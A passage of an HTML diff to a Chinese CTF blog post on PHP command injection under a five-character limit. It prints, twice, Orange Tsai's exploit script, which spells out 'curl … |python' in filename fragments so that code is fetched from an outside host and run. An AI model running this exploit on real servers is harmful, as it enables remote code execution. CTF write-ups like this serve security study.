$sandbox);</span><br><span class="line">   }</span><br><span class="line">   highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></tbody></table></figure><p></p>
 <p>这个字符长度限制不能大于5个，我们写字符还是可以的，但是我们的<code>ls -t&gt;a</code>用不了，不过我们可以用前面的思路，把<code>ls -t&gt;a</code>拆分为几段放在一个文件中，然后再执行。</p>
 <figure class="image-bubble">
                 <div class="img-lightbox">
@@ -501,44 +386,7 @@ b<span class="token operator">=</span>requests<span class="token punctuation">.<
                 </div>
                 <div class="image-caption">image.png</div>
             </figure>
-<p>可以发现2-5行是可以执行<code>ls -t&gt;g</code>的，然后后面的步骤就和前面一题一样了，这里就不多赘述了<br>贴一下Orange师傅的exp：</p>
-<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
-<span class="token keyword">from</span> time <span class="token keyword">import</span> sleep
-<span class="token keyword">from</span> urllib <span class="token keyword">import</span> quote
-payload <span class="token operator">=</span> <span class="token punctuation">[</span>
-   <span class="token comment" spellcheck="true"># generate `ls -t>g` file</span>
-   <span class="token string">'>ls\\'</span><span class="token punctuation">,</span>
-   <span class="token string">'ls>_'</span><span class="token punctuation">,</span>
-   <span class="token string">'>\ \\'</span><span class="token punctuation">,</span>
-   <span class="token string">'>-t\\'</span><span class="token punctuation">,</span>
-   <span class="token string">'>\>g'</span><span class="token punctuation">,</span>
-   <span class="token string">'ls>>_'</span><span class="token punctuation">,</span>
-   <span class="token comment" spellcheck="true"># generate `curl orange.tw.tw>python`</span>
-   <span class="token comment" spellcheck="true"># curl shell.0xb.pw|python</span>
-   <span class="token string">'>on'</span><span class="token punctuation">,</span>
-   <span class="token string">'>th\\'</span><span class="token punctuation">,</span>
-   <span class="token string">'>py\\'</span><span class="token punctuation">,</span>
-   <span class="token string">'>\|\\'</span><span class="token punctuation">,</span>
-   <span class="token string">'>pw\\'</span><span class="token punctuation">,</span>
-   <span class="token string">'>x.\\'</span><span class="token punctuation">,</span>
-   <span class="token string">'>xx\\'</span><span class="token punctuation">,</span>
-   <span class="token string">'>l.\\'</span><span class="token punctuation">,</span>
-   <span class="token string">'>el\\'</span><span class="token punctuation">,</span>
-   <span class="token string">'>sh\\'</span><span class="token punctuation">,</span>
-   <span class="token string">'>\ \\'</span><span class="token punctuation">,</span>
-   <span class="token string">'>rl\\'</span><span class="token punctuation">,</span>
-   <span class="token string">'>cu\\'</span><span class="token punctuation">,</span>
-   <span class="token comment" spellcheck="true"># exec</span>
-   <span class="token string">'sh _'</span><span class="token punctuation">,</span>
-   <span class="token string">'sh g'</span><span class="token punctuation">,</span>
-<span class="token punctuation">]</span>
-<span class="token comment" spellcheck="true"># r = requests.get('http://localhost/tmp/?reset=1')</span>
-<span class="token keyword">for</span> i <span class="token keyword">in</span> payload<span class="token punctuation">:</span>
-   <span class="token keyword">assert</span> len<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">5</span>
-   r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://localhost/tmp/?cmd='</span> <span class="token operator">+</span> quote<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token punctuation">)</span>
-   <span class="token keyword">print</span> i
-   sleep<span class="token punctuation">(</span><span class="token number">0.2</span><span class="token punctuation">)</span>
-</code></pre>
+<p>可以发现2-5行是可以执行<code>ls -t&gt;g</code>的，然后后面的步骤就和前面一题一样了，这里就不多赘述了<br>贴一下Orange师傅的exp：<br></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote</span><br><span class="line">payload = [</span><br><span class="line">   <span class="comment"># generate `ls -t&gt;g` file</span></span><br><span class="line">   <span class="string">'&gt;ls\\'</span>,</span><br><span class="line">   <span class="string">'ls&gt;_'</span>,</span><br><span class="line">   <span class="string">'&gt;\ \\'</span>,</span><br><span class="line">   <span class="string">'&gt;-t\\'</span>,</span><br><span class="line">   <span class="string">'&gt;\&gt;g'</span>,</span><br><span class="line">   <span class="string">'ls&gt;&gt;_'</span>,</span><br><span class="line">   <span class="comment"># generate `curl orange.tw.tw&gt;python`</span></span><br><span class="line">   <span class="comment"># curl shell.0xb.pw|python</span></span><br><span class="line">   <span class="string">'&gt;on'</span>,</span><br><span class="line">   <span class="string">'&gt;th\\'</span>,</span><br><span class="line">   <span class="string">'&gt;py\\'</span>,</span><br><span class="line">   <span class="string">'&gt;\|\\'</span>,</span><br><span class="line">   <span class="string">'&gt;pw\\'</span>,</span><br><span class="line">   <span class="string">'&gt;x.\\'</span>,</span><br><span class="line">   <span class="string">'&gt;xx\\'</span>,</span><br><span class="line">   <span class="string">'&gt;l.\\'</span>,</span><br><span class="line">   <span class="string">'&gt;el\\'</span>,</span><br><span class="line">   <span class="string">'&gt;sh\\'</span>,</span><br><span class="line">   <span class="string">'&gt;\ \\'</span>,</span><br><span class="line">   <span class="string">'&gt;rl\\'</span>,</span><br><span class="line">   <span class="string">'&gt;cu\\'</span>,</span><br><span class="line">   <span class="comment"># exec</span></span><br><span class="line">   <span class="string">'sh _'</span>,</span><br><span class="line">   <span class="string">'sh g'</span>,</span><br><span class="line">]</span><br><span class="line"><span class="comment"># r = requests.get('http://localhost/tmp/?reset=1')</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">   <span class="keyword">assert</span> len(i) &lt;= <span class="number">5</span></span><br><span class="line">   r = requests.get(<span class="string">'http://localhost/tmp/?cmd='</span> + quote(i) )</span><br><span class="line">   <span class="keyword">print</span> i</span><br><span class="line">   sleep(<span class="number">0.2</span>)</span><br></pre></td></tr></tbody></table></figure><p></p>
 <h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://portswigger.net/web-security/os-command-injection" title="https://portswigger.net/web-security/os-command-injection" target="_blank" rel="noopener">https://portswigger.net/web-security/os-command-injection</a><br><a href="https://mp.weixin.qq.com/s/Hm6TiLHiAygrJr-MGRq9Mw" title="https://mp.weixin.qq.com/s/Hm6TiLHiAygrJr-MGRq9Mw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/Hm6TiLHiAygrJr-MGRq9Mw</a></p>
 <script>
         document.querySelectorAll('.github-emoji')
@@ -684,6 +532,13 @@ payload <span class="token operator">=</span> <span class="token punctuation">[<
 
 
 
+<section class="comments" id="comments">
+    <!-- UY BEGIN -->
+    <div id="uyan_frame"></div>
+    <script src="http://v2.uyan.cc/code/uyan.js?uid=true"></script>
+    <!-- UY END -->
+</section>
+
 
 
 
@@ -750,7 +605,7 @@ payload <span class="token operator">=</span> <span class="token punctuation">[<
         </p>
     </div>
     <div class="bottom">
-        <p><span> &copy; 2015 - 2019</span>
+        <p><span> &copy; 2018 - 2019</span>
             <span>
                 
                 Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
